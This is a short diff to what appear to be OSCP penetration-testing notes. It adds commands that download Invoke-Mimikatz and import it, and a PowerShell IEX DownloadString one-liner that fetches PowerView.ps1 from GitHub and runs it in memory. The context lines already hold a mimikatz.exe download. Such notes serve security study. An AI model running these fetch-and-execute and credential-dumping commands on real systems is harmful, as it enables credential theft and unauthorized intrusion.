@@ -1234,7 +1234,11 @@ curl https://github.com/n0ts0cial/oscp/raw/main/x64/mimikatz.exe -Outfile mimika
 .\mimikatz.exe
 ```
 ```
-aaa
+curl https://github.com/n0ts0cial/oscp/raw/main/Invoke-Mimikatz.ps1 -Outfile Invoke-Mimikatz.ps1
+Import-Module .\Invoke-Mimikatz.ps1
+```
+```
+IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/PowerView.ps1")
 ```
 
 
